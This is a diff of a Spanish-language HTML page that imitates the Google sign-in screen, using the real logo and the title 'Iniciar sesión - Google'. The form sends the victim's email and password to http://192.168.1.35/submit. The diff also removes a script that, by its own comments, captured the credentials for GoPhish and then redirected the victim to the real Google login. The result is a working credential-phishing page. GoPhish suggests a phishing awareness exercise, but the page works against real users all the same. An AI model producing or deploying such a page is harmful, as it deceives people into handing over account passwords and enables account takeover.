@@ -1,8 +1,10 @@
-<!DOCTYPE html><html lang="es"><head>
+<!DOCTYPE html>
+<html lang="es">
+<head>
     <meta charset="UTF-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Iniciar sesión - Google</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&amp;display=swap"/>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap"/>
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -54,30 +56,12 @@
     <div class="container">
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google" class="logo"/>
         <h2>Iniciar sesión</h2>
-        <form method="POST" action="">
-            <input type="email" name="email" placeholder="Correo electrónico" required=""/>
-            <input type="password" name="password" placeholder="Contraseña" required=""/>
+        <form method="POST" action="http://192.168.1.35/submit">
+            <input type="email" name="email" placeholder="Correo electrónico" required/>
+            <input type="password" name="password" placeholder="Contraseña" required/>
             <button type="submit">Siguiente</button>
         </form>
         <p class="footer">¿Olvidaste tu contraseña?</p>
     </div>
-
-    <script>
-        document.querySelector("form").addEventListener("submit", function(event) {
-            event.preventDefault(); // Evita el envío normal
-            var email = document.querySelector('input[name="email"]').value;
-            var password = document.querySelector('input[name="password"]').value;
-            
-            // Envía los datos a GoPhish para su captura
-            fetch("", { // GoPhish automáticamente reemplaza esto con la URL correcta
-                method: "POST",
-                body: new URLSearchParams({ email: email, password: password })
-            }).then(() => {
-                // Redirige a la página real de Google después del intento
-                window.location.href = "https://accounts.google.com/signin";
-            });
-        });
-    </script>
-
-
-</body></html>
+</body>
+</html>
